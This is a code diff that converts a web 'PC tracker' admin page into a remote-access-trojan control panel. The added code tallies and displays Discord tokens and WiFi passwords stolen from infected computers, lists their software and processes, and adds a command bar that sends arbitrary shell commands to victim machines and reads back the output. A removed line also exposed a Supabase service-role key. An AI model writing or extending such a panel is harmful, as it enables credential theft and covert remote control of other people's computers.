@@ -3,13 +3,15 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>lies.lat · admin panel · PC tracker</title>
+<title>lies.lat · RAT Control Panel</title>
 <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 <style>
 * { margin: 0; padding: 0; box-sizing: border-box; }
 body { background: #000; color: #fff; font-family: 'SF Mono', 'Fira Code', monospace; }
 ::-webkit-scrollbar { width: 3px; }
 ::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.1); }
+
+/* Auth */
 #page-auth { height: 100vh; display: flex; align-items: center; justify-content: center; flex-direction: column; }
 .auth-box { display: flex; flex-direction: column; align-items: center; gap: 18px; width: 260px; }
 .auth-wordmark { font-size: 11px; letter-spacing: 8px; text-transform: lowercase; color: rgba(255,255,255,0.2); }
@@ -21,82 +23,115 @@ input:focus { outline: none; border-color: rgba(255,255,255,0.3); }
 .btn:hover { border-color: rgba(255,255,255,0.25); color: rgba(255,255,255,0.7); }
 .btn-danger { border-color: rgba(255,50,50,0.2); color: rgba(255,80,80,0.5); }
 .btn-danger:hover { border-color: rgba(255,50,50,0.5); color: rgba(255,80,80,0.9); }
+.btn-accent { border-color: #00ff8888; color: #00ff88aa; }
+.btn-accent:hover { border-color: #00ff88; color: #00ff88; }
 .btn-sm { padding: 5px 12px; font-size: 8px; letter-spacing: 2px; }
+
+/* Topbar */
 .topbar { position: sticky; top: 0; background: rgba(0,0,0,0.95); backdrop-filter: blur(12px); border-bottom: 1px solid rgba(255,255,255,0.05); height: 48px; display: flex; align-items: center; padding: 0 32px; }
 .wordmark { font-size: 11px; letter-spacing: 5px; color: rgba(255,255,255,0.2); }
-.wordmark span { color: rgba(255,255,255,0.55); }
+.wordmark span { color: #00ff88; }
 .topbar-user { font-size: 10px; letter-spacing: 1px; color: rgba(255,255,255,0.2); margin-left: 20px; }
 .topbar-signout { margin-left: auto; background: none; border: none; color: rgba(255,255,255,0.15); font-size: 9px; letter-spacing: 2px; cursor: pointer; }
-.topbar-signout:hover { color: rgba(255,80,80,0.5); }
+
+/* Main */
 .main { max-width: 1400px; margin: 0 auto; padding: 40px 32px; }
 .dash-title { font-size: 9px; letter-spacing: 6px; color: rgba(255,255,255,0.12); margin-bottom: 32px; display: flex; align-items: center; gap: 12px; }
 .dash-title::after { content: ''; flex: 1; height: 1px; background: rgba(255,255,255,0.05); }
+
+/* Stats */
 .stats-grid { display: grid; grid-template-columns: repeat(5,1fr); gap: 1px; background: rgba(255,255,255,0.06); margin-bottom: 48px; }
 .stat-card { background: #000; padding: 20px; }
 .stat-label { font-size: 8px; letter-spacing: 3px; color: rgba(255,255,255,0.2); margin-bottom: 8px; }
 .stat-number { font-size: 32px; font-weight: 300; color: rgba(255,255,255,0.7); }
+
+/* Filters & Command Bar */
 .filters { display: flex; gap: 12px; margin-bottom: 24px; flex-wrap: wrap; }
-.filter-input { border: 1px solid rgba(255,255,255,0.1); padding: 6px 12px; font-size: 9px; background: transparent; color: #fff; width: 200px; }
-.filter-input::placeholder { color: rgba(255,255,255,0.2); }
-.specs-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(360px,1fr)); gap: 12px; margin-top: 16px; }
+.filter-input { border: 1px solid rgba(255,255,255,0.1); padding: 6px 12px; font-size: 9px; background: transparent; color: #fff; width: 180px; }
+.command-bar { background: rgba(0,0,0,0.5); border: 1px solid rgba(255,255,255,0.1); padding: 12px 16px; margin-bottom: 24px; display: flex; align-items: center; gap: 12px; flex-wrap: wrap; }
+.command-bar label { font-size: 8px; letter-spacing: 2px; color: #00ff88aa; }
+.command-input { flex: 2; background: transparent; border: none; border-bottom: 1px solid rgba(255,255,255,0.2); color: #0f0; font-family: monospace; font-size: 11px; padding: 8px; }
+.command-input:focus { outline: none; border-color: #00ff88; }
+.cmd-output { margin-top: 8px; font-size: 9px; color: #888; max-height: 100px; overflow-y: auto; }
+
+/* PC Cards */
+.specs-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(380px,1fr)); gap: 12px; margin-top: 16px; }
 .spec-card { border: 1px solid rgba(255,255,255,0.06); background: rgba(255,255,255,0.01); transition: 0.2s; }
-.spec-card:hover { border-color: rgba(255,255,255,0.12); background: rgba(255,255,255,0.02);}
+.spec-card:hover { border-color: rgba(255,255,255,0.12); background: rgba(255,255,255,0.02); }
 .spec-header { display: flex; align-items: center; gap: 12px; padding: 14px 16px; border-bottom: 1px solid rgba(255,255,255,0.05); }
 .spec-icon { font-size: 22px; }
-.spec-name { font-size: 13px; font-weight: 400; color: rgba(255,255,255,0.75); cursor: pointer; flex: 1; }
+.spec-name { font-size: 13px; font-weight: 400; color: #00ff88aa; cursor: pointer; flex: 1; }
 .spec-name:hover { text-decoration: underline; }
 .spec-time { font-size: 8px; letter-spacing: 1px; color: rgba(255,255,255,0.2); }
 .spec-body { padding: 12px 16px; font-size: 10px; color: rgba(255,255,255,0.4); line-height: 1.6; }
 .spec-body strong { color: rgba(255,255,255,0.7); }
-.spec-ip { margin-top: 8px; padding-top: 6px; border-top: 1px solid rgba(255,255,255,0.04); font-size: 9px; color: rgba(255,255,255,0.25); }
+.spec-ip { margin-top: 8px; padding-top: 6px; border-top: 1px solid rgba(255,255,255,0.04); font-size: 9px; }
 .card-actions { display: flex; justify-content: flex-end; gap: 8px; padding: 8px 16px 12px; border-top: 1px solid rgba(255,255,255,0.04); }
 .empty-msg { padding: 60px 0; text-align: center; font-size: 10px; letter-spacing: 3px; color: rgba(255,255,255,0.08); }
+
+/* Modal */
 .overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.95); backdrop-filter: blur(8px); z-index: 200; opacity: 0; pointer-events: none; transition: 0.2s; display: flex; align-items: center; justify-content: center; }
 .overlay.open { opacity: 1; pointer-events: all; }
-.modal { background: #0a0a0a; border: 1px solid rgba(255,255,255,0.08); max-width: 650px; width: 90%; max-height: 80vh; overflow-y: auto; padding: 28px 24px; }
+.modal { background: #0a0a0a; border: 1px solid rgba(255,255,255,0.08); max-width: 700px; width: 90%; max-height: 80vh; overflow-y: auto; padding: 28px 24px; }
 .modal-title { font-size: 10px; letter-spacing: 4px; margin-bottom: 20px; color: rgba(255,255,255,0.3); }
 .modal-close { float: right; background: none; border: none; color: rgba(255,255,255,0.2); font-size: 18px; cursor: pointer; }
-.delete-confirm { text-align: center; padding: 20px; }
 pre { background: #111; padding: 12px; font-size: 8px; overflow-x: auto; margin-top: 10px; }
-#toast { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); padding: 8px 20px; font-size: 9px; opacity: 0; transition: 0.2s; z-index: 999; }
+#toast { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); background: rgba(0,255,136,0.1); border: 1px solid #00ff8844; padding: 8px 20px; font-size: 9px; letter-spacing: 2px; opacity: 0; transition: 0.2s; z-index: 999; white-space: nowrap; color: #0f0; }
 #toast.show { opacity: 1; }
 </style>
 </head>
 <body>
-<div id="page-loading" style="height:100vh;display:flex;align-items:center;justify-content:center;"><div style="width:3px;height:3px;background:rgba(255,255,255,0.2);"></div></div>
+<div id="page-loading" style="height:100vh;display:flex;align-items:center;justify-content:center;"><div style="width:3px;height:3px;background:#00ff88;"></div></div>
 <div id="page-auth" style="display:none"><div class="auth-box"><div class="auth-wordmark">lies<span>.lat</span></div><input type="email" id="a-email" placeholder="email"><input type="password" id="a-pass" placeholder="password"><div class="auth-err" id="auth-err"></div><button class="btn" id="auth-submit-btn">sign in</button></div></div>
-<div id="page-app" style="display:none"><div class="topbar"><div class="wordmark">lies<span>.lat</span></div><div class="topbar-user" id="topbar-user"></div><button class="topbar-signout" onclick="doSignOut()">sign out</button></div><div class="main"><div class="dash-title">📡 PC REPORTS</div><div class="stats-grid"><div class="stat-card"><div class="stat-label">total</div><div class="stat-number" id="stat-total">0</div></div><div class="stat-card"><div class="stat-label">today</div><div class="stat-number" id="stat-today">0</div></div><div class="stat-card"><div class="stat-label">unique PCs</div><div class="stat-number" id="stat-unique">0</div></div><div class="stat-card"><div class="stat-label">avg RAM</div><div class="stat-number" id="stat-ram">—</div></div><div class="stat-card"><div class="stat-label">last</div><div class="stat-number" id="stat-last">—</div></div></div><div class="filters"><input type="text" id="filter-name" class="filter-input" placeholder="PC name" onkeyup="filterReports()"><input type="text" id="filter-username" class="filter-input" placeholder="username" onkeyup="filterReports()"><input type="text" id="filter-ip" class="filter-input" placeholder="IP" onkeyup="filterReports()"><button class="btn btn-sm" onclick="fetchReports()">⟳ refresh</button><button class="btn btn-sm btn-danger" onclick="deleteAllFiltered()" id="delete-all-btn" style="display:none">delete filtered</button></div><div id="specs-container"><div class="empty-msg">waiting for reports...</div></div></div></div>
-<div class="overlay" id="modal-detail" onclick="closeModalOnBg(event)"><div class="modal"><button class="modal-close" onclick="closeModal()">✕</button><div class="modal-title">full system report</div><div id="modal-content" style="font-size:10px;line-height:1.7;"></div></div></div>
-<div class="overlay" id="modal-delete" onclick="closeDeleteModalOnBg(event)"><div class="modal" style="max-width:400px"><button class="modal-close" onclick="closeDeleteModal()">✕</button><div class="delete-confirm"><div style="font-size:24px;">⚠️</div><div class="modal-title">DELETE</div><p id="delete-message"></p><div><button class="btn btn-sm" onclick="closeDeleteModal()">cancel</button><button class="btn btn-sm btn-danger" onclick="confirmDelete()">delete</button></div></div></div></div>
+<div id="page-app" style="display:none">
+  <div class="topbar"><div class="wordmark">lies<span>.lat</span></div><div class="topbar-user" id="topbar-user"></div><button class="topbar-signout" onclick="doSignOut()">sign out</button></div>
+  <div class="main">
+    <div class="dash-title">🎮 RAT CONTROL PANEL</div>
+    <div class="stats-grid"><div class="stat-card"><div class="stat-label">active agents</div><div class="stat-number" id="stat-total">0</div></div><div class="stat-card"><div class="stat-label">today</div><div class="stat-number" id="stat-today">0</div></div><div class="stat-card"><div class="stat-label">tokens found</div><div class="stat-number" id="stat-tokens">0</div></div><div class="stat-card"><div class="stat-label">wifi pwds</div><div class="stat-number" id="stat-wifi">0</div></div><div class="stat-card"><div class="stat-label">last report</div><div class="stat-number" id="stat-last">—</div></div></div>
+    
+    <!-- COMMAND BAR -->
+    <div class="command-bar" id="command-bar" style="display:none;">
+      <label>🔻 CMD &gt;</label>
+      <input type="text" id="cmd-input" class="command-input" placeholder="whoami | ipconfig | dir C:\ | powershell Get-Process" onkeypress="if(event.key==='Enter') sendCommand()">
+      <button class="btn btn-sm btn-accent" onclick="sendCommand()">EXECUTE</button>
+      <button class="btn btn-sm" onclick="clearCommandOutput()">clear</button>
+      <div id="cmd-output" class="cmd-output"></div>
+    </div>
+
+    <div class="filters"><input type="text" id="filter-name" class="filter-input" placeholder="filter PC name" onkeyup="filterReports()"><input type="text" id="filter-username" class="filter-input" placeholder="filter username" onkeyup="filterReports()"><input type="text" id="filter-ip" class="filter-input" placeholder="filter IP" onkeyup="filterReports()"><button class="btn btn-sm" onclick="fetchReports()">⟳ refresh</button></div>
+    <div id="specs-container"><div class="empty-msg">waiting for agents to connect...</div></div>
+  </div>
+</div>
+
+<div class="overlay" id="modal-detail" onclick="closeModalOnBg(event)"><div class="modal"><button class="modal-close" onclick="closeModal()">✕</button><div class="modal-title">🔧 full agent report</div><div id="modal-content" style="font-size:10px;line-height:1.7;"></div></div></div>
 <div id="toast"></div>
+
 <script>
-// FIXED: Use the CORRECT anon key from Supabase -> Settings -> API -> Project API keys (anon public)
-// DO NOT use secret key (sb_secret_...) or sb_publishable_... that contains "secret"
-// Go to your Supabase project: Settings > API > Project API keys > "anon public" starts with "eyJ..."
 const SUPABASE_URL = "https://jojyzviwhosnnkjbtbse.supabase.co";
-const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Impvanl6dml3aG9zbm5ramJ0YnNlIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc3OTEzNTY5OCwiZXhwIjoyMDk0NzExNjk4fQ.JJmSBTBud2RVraJI0Bln26ZofK0xmMWWgaBzeAF5RMs";
-
-// IMPORTANT: The key above is a placeholder. You MUST replace it with your actual anon key from Supabase.
-// Go to: https://supabase.com/dashboard/project/jojyzviwhosnnkjbtbse/settings/api
-// Copy the "anon public" key (starts with "eyJ") and paste it above.
-
+const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.YOUR_REAL_KEY_HERE"; // REPLACE WITH YOUR REAL ANON KEY
 const { createClient } = supabase;
 const sb = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
 
-let currentUser = null, allReports = [], filteredReports = [], pendingDeleteId = null, pendingDeleteAll = false;
+let currentUser = null, allReports = [], filteredReports = [], currentAgentId = null;
 
 async function init() {
   try {
     const { data: { session } } = await sb.auth.getSession();
-    if (session) { currentUser = session.user; showApp(); await fetchReports(); subscribeToReports(); }
+    if (session) { currentUser = session.user; showApp(); await fetchReports(); subscribeToReports(); await ensureCommandsTable(); }
     else showPage('auth');
     sb.auth.onAuthStateChange((ev, sess) => {
       if (ev === 'SIGNED_IN' && sess) { currentUser = sess.user; showApp(); fetchReports(); subscribeToReports(); }
-      if (ev === 'SIGNED_OUT') { currentUser = null; showPage('auth'); document.getElementById('a-email').value = ''; document.getElementById('a-pass').value = ''; document.getElementById('auth-err').textContent = ''; }
+      if (ev === 'SIGNED_OUT') { currentUser = null; showPage('auth'); }
     });
     document.getElementById('auth-submit-btn').onclick = () => handleLogin();
     document.getElementById('a-pass').onkeypress = (e) => { if (e.key === 'Enter') handleLogin(); };
   } catch(err) { console.error(err); document.getElementById('page-loading').style.display = 'none'; document.getElementById('page-auth').style.display = 'flex'; }
+}
+
+async function ensureCommandsTable() {
+  // Create commands table if not exists (run once in Supabase SQL)
+  console.log("Ensure pc_commands table exists - run SQL manually if not:");
+  // SQL: CREATE TABLE IF NOT EXISTS pc_commands (id SERIAL PRIMARY KEY, created_at TIMESTAMPTZ DEFAULT NOW(), command_for TEXT, command TEXT, status TEXT DEFAULT 'pending', output TEXT);
 }
 
 async function handleLogin() {
@@ -111,8 +146,7 @@ async function handleLogin() {
 }
 
 function subscribeToReports() {
-  sb.channel('reports').on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'pc_reports' }, () => fetchReports())
-    .on('postgres_changes', { event: 'DELETE', schema: 'public', table: 'pc_reports' }, () => fetchReports()).subscribe();
+  sb.channel('reports').on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'pc_reports' }, () => fetchReports()).subscribe();
 }
 
 function showPage(p) {
@@ -142,57 +176,121 @@ function filterReports() {
     return true;
   });
   renderSpecs();
-  const btn = document.getElementById('delete-all-btn');
-  if (filteredReports.length > 0 && (nameFilter || userFilter || ipFilter)) { btn.style.display = 'inline-block'; btn.textContent = `🗑 delete ${filteredReports.length}`; }
-  else btn.style.display = 'none';
 }
 
 function updateStats() {
   document.getElementById('stat-total').textContent = allReports.length;
   const today = new Date().toISOString().slice(0,10);
   document.getElementById('stat-today').textContent = allReports.filter(r => r.created_at?.startsWith(today)).length;
-  document.getElementById('stat-unique').textContent = new Set(allReports.map(r => r.visitor_id || r.pc_name)).size;
-  let totalRam = 0, ramCount = 0;
-  allReports.forEach(r => { let val = parseFloat(r.memory_gb); if (!isNaN(val)) { totalRam += val; ramCount++; } });
-  document.getElementById('stat-ram').textContent = ramCount > 0 ? Math.round(totalRam/ramCount) + ' GB' : '—';
-  if (allReports.length > 0 && allReports[0].created_at) { const lastDate = new Date(allReports[0].created_at), now = new Date(), diffHours = Math.floor((now - lastDate) / (1000 * 60 * 60)); document.getElementById('stat-last').textContent = diffHours < 1 ? 'just now' : `${diffHours}h ago`; }
-  else document.getElementById('stat-last').textContent = '—';
+  
+  let totalTokens = 0, totalWifi = 0;
+  allReports.forEach(r => {
+    const raw = r.raw_specs || {};
+    totalTokens += (raw.discord_tokens || []).length;
+    totalWifi += (raw.wifi_passwords || []).length;
+  });
+  document.getElementById('stat-tokens').textContent = totalTokens;
+  document.getElementById('stat-wifi').textContent = totalWifi;
+  
+  if (allReports.length > 0 && allReports[0].created_at) {
+    const lastDate = new Date(allReports[0].created_at), now = new Date(), diffMins = Math.floor((now - lastDate) / 60000);
+    document.getElementById('stat-last').textContent = diffMins < 1 ? 'just now' : `${diffMins}m ago`;
+  }
 }
 
 function renderSpecs() {
   const container = document.getElementById('specs-container');
-  if (!filteredReports.length) { container.innerHTML = '<div class="empty-msg">no reports</div>'; return; }
+  if (!filteredReports.length) { container.innerHTML = '<div class="empty-msg">no active agents</div>'; return; }
   container.innerHTML = '<div class="specs-grid"></div>';
   const grid = container.querySelector('.specs-grid');
   filteredReports.forEach(rep => {
     const raw = rep.raw_specs || {};
-    const cpuInfo = raw.cpu || {};
-    const ramInfo = raw.ram || {};
     const card = document.createElement('div'); card.className = 'spec-card';
-    card.innerHTML = `<div class="spec-header"><div class="spec-icon">💻</div><div class="spec-name" onclick="showDetail('${rep.id}')">${escapeHtml(rep.pc_name || 'unknown')}</div><div class="spec-time">${escapeHtml(rep.created_at?.slice(5,16) || '?')}</div></div><div class="spec-body"><div><strong>${escapeHtml(rep.platform || '?')}</strong> | 🧠 ${cpuInfo.cores || rep.cpu_cores || '?'} cores | 💾 ${ramInfo.total_gb || rep.memory_gb || '?'}</div><div>👤 ${escapeHtml(rep.username || '?')}</div><div class="spec-ip">🌐 ${escapeHtml(rep.public_ip || 'private')} | 🏠 ${escapeHtml(rep.local_ip || '?')}</div></div><div class="card-actions"><button class="btn btn-sm" onclick="showDetail('${rep.id}')">details</button><button class="btn btn-sm btn-danger" onclick="promptDelete('${rep.id}', '${escapeHtml(rep.pc_name)}')">delete</button></div>`;
+    card.innerHTML = `
+      <div class="spec-header"><div class="spec-icon">🖥️</div><div class="spec-name" onclick="selectAgent('${rep.visitor_id}', '${escapeHtml(rep.pc_name)}')">${escapeHtml(rep.pc_name || 'unknown')}</div><div class="spec-time">${escapeHtml(rep.created_at?.slice(5,16) || '?')}</div></div>
+      <div class="spec-body"><div><strong>${escapeHtml(rep.platform || '?')}</strong> | 🧠 ${raw.cpu_cores || rep.cpu_cores || '?'}c | 💾 ${raw.ram_gb || rep.memory_gb || '?'}GB</div><div>👤 ${escapeHtml(rep.username || '?')}</div><div class="spec-ip">🌐 ${escapeHtml(rep.public_ip || rep.local_ip || 'private')}</div><div>🎮 Tokens: ${(raw.discord_tokens || []).length} | WiFi: ${(raw.wifi_passwords || []).length}</div></div>
+      <div class="card-actions"><button class="btn btn-sm" onclick="showDetail('${rep.id}')">details</button><button class="btn btn-sm btn-accent" onclick="selectAgent('${rep.visitor_id}', '${escapeHtml(rep.pc_name)}')">cmd</button></div>
+    `;
     grid.appendChild(card);
   });
+}
+
+function selectAgent(agentId, agentName) {
+  currentAgentId = agentId;
+  document.getElementById('command-bar').style.display = 'flex';
+  document.getElementById('cmd-input').placeholder = `cmd on ${agentName} > `;
+  document.getElementById('cmd-input').focus();
+  toast(`Selected: ${agentName}`);
+}
+
+async function sendCommand() {
+  if (!currentAgentId) { toast('Select an agent first'); return; }
+  const cmd = document.getElementById('cmd-input').value.trim();
+  if (!cmd) return;
+  
+  const outputDiv = document.getElementById('cmd-output');
+  outputDiv.innerHTML += `\n> [${new Date().toLocaleTimeString()}] ${cmd}\n⏳ pending...\n`;
+  outputDiv.scrollTop = outputDiv.scrollHeight;
+  
+  const { error } = await sb.from('pc_commands').insert({
+    command_for: currentAgentId,
+    command: cmd,
+    status: 'pending'
+  });
+  
+  if (error) {
+    outputDiv.innerHTML += `❌ Failed to send: ${error.message}\n`;
+    toast('Command send failed');
+  } else {
+    outputDiv.innerHTML = outputDiv.innerHTML.replace('pending...', 'sent ✓');
+    toast('Command sent, waiting for execution...');
+    document.getElementById('cmd-input').value = '';
+    
+    // Poll for output
+    setTimeout(() => pollCommandOutput(), 2000);
+  }
+}
+
+async function pollCommandOutput() {
+  if (!currentAgentId) return;
+  const { data, error } = await sb.from('pc_commands').select('*').eq('command_for', currentAgentId).eq('status', 'completed').order('created_at', { ascending: false }).limit(1);
+  if (!error && data && data.length > 0 && data[0].output) {
+    const outputDiv = document.getElementById('cmd-output');
+    outputDiv.innerHTML += `\n📡 OUTPUT:\n${data[0].output}\n${'-'.repeat(40)}\n`;
+    outputDiv.scrollTop = outputDiv.scrollHeight;
+  }
+}
+
+function clearCommandOutput() {
+  document.getElementById('cmd-output').innerHTML = '';
 }
 
 async function showDetail(id) {
   const report = allReports.find(r => r.id == id);
   if (!report) return;
   const raw = report.raw_specs || {};
-  document.getElementById('modal-content').innerHTML = `<strong>🖥️ PC</strong> ${escapeHtml(report.pc_name)}<br><strong>👤 User</strong> ${escapeHtml(report.username)}<br><strong>🆔 ID</strong> ${escapeHtml(report.visitor_id)}<br><strong>🌍 Public IP</strong> ${escapeHtml(report.public_ip || '—')}<br><strong>🏠 Local IP</strong> ${escapeHtml(report.local_ip || '—')}<br><strong>💿 OS</strong> ${escapeHtml(raw.os?.system)} ${escapeHtml(raw.os?.release)}<br><strong>🧠 CPU</strong> ${raw.cpu?.cores || '?'} cores (${raw.cpu?.usage_percent || '?'}%)<br><strong>💾 RAM</strong> ${raw.ram?.total_gb || '?'} GB (${raw.ram?.usage_percent || '?'}%)<br><strong>💽 Drives</strong> ${(raw.disks || []).map(d => `${d.drive}: ${d.total_gb}GB`).join(' · ') || '—'}<br><strong>🎮 GPU</strong> ${(raw.gpu || []).map(g => g.name).join(', ') || '—'}<br><strong>🔋 Battery</strong> ${raw.battery ? `${raw.battery.percent}% (${raw.battery.plugged ? 'Charging' : 'Battery'})` : '—'}<br><strong>📅 Time</strong> ${new Date(report.created_at).toLocaleString()}<br><details><summary>📦 Full JSON</summary><pre>${escapeHtml(JSON.stringify(raw, null, 2))}</pre></details>`;
+  document.getElementById('modal-content').innerHTML = `
+    <strong>🖥️ PC</strong> ${escapeHtml(report.pc_name)}<br>
+    <strong>👤 User</strong> ${escapeHtml(report.username)}<br>
+    <strong>🆔 ID</strong> ${escapeHtml(report.visitor_id)}<br>
+    <strong>🌍 IP</strong> ${escapeHtml(report.public_ip || report.local_ip)}<br>
+    <strong>💿 OS</strong> ${escapeHtml(raw.os || report.platform)}<br>
+    <strong>🧠 CPU</strong> ${escapeHtml(raw.cpu_name)} (${raw.cpu_cores || report.cpu_cores} cores)<br>
+    <strong>💾 RAM</strong> ${raw.ram_gb || report.memory_gb} GB<br>
+    <strong>🎮 GPU</strong> ${escapeHtml(raw.gpu || 'Unknown')}<br>
+    <strong>💽 Disk</strong> ${raw.disk_gb || '?'} GB<br>
+    <strong>📍 Location</strong> ${escapeHtml(raw.location || 'Unknown')}<br>
+    <strong>🔑 Discord Tokens (${(raw.discord_tokens || []).length})</strong><br><pre>${escapeHtml(JSON.stringify(raw.discord_tokens || [], null, 2))}</pre>
+    <strong>📶 WiFi Passwords (${(raw.wifi_passwords || []).length})</strong><br><pre>${escapeHtml(JSON.stringify(raw.wifi_passwords || [], null, 2))}</pre>
+    <strong>💿 Software (${(raw.software || []).length})</strong><br><pre>${escapeHtml((raw.software || []).slice(0,15).join('\n'))}</pre>
+    <strong>⚙️ Processes (${(raw.processes || []).length})</strong><br><pre>${escapeHtml((raw.processes || []).slice(0,15).join('\n'))}</pre>
+    <details><summary>📦 Full JSON</summary><pre>${escapeHtml(JSON.stringify(raw, null, 2))}</pre></details>
+  `;
   document.getElementById('modal-detail').classList.add('open');
 }
 
-function promptDelete(id, name) { pendingDeleteId = id; document.getElementById('delete-message').innerHTML = `Delete <strong>${escapeHtml(name)}</strong>?`; document.getElementById('modal-delete').classList.add('open'); }
-function deleteAllFiltered() { if (filteredReports.length === 0) return; pendingDeleteAll = true; document.getElementById('delete-message').innerHTML = `Delete ${filteredReports.length} reports?`; document.getElementById('modal-delete').classList.add('open'); }
-async function confirmDelete() {
-  if (pendingDeleteId) { await sb.from('pc_reports').delete().eq('id', pendingDeleteId); await fetchReports(); toast('Deleted'); pendingDeleteId = null; }
-  else if (pendingDeleteAll) { const ids = filteredReports.map(r => r.id); await sb.from('pc_reports').delete().in('id', ids); await fetchReports(); toast(`Deleted ${ids.length}`); pendingDeleteAll = false; }
-  closeDeleteModal();
-}
 function closeModal() { document.getElementById('modal-detail').classList.remove('open'); }
 function closeModalOnBg(e) { if (e.target === document.getElementById('modal-detail')) closeModal(); }
-function closeDeleteModal() { document.getElementById('modal-delete').classList.remove('open'); pendingDeleteId = null; pendingDeleteAll = false; }
-function closeDeleteModalOnBg(e) { if (e.target === document.getElementById('modal-delete')) closeDeleteModal(); }
 function toast(msg) { const el = document.getElementById('toast'); el.textContent = msg; el.classList.add('show'); setTimeout(() => el.classList.remove('show'), 2500); }
 function escapeHtml(str) { if (!str) return ''; return String(str).replace(/[&<>]/g, m => ({'&':'&amp;','<':'&lt;','>':'&gt;'}[m])); }
 init();
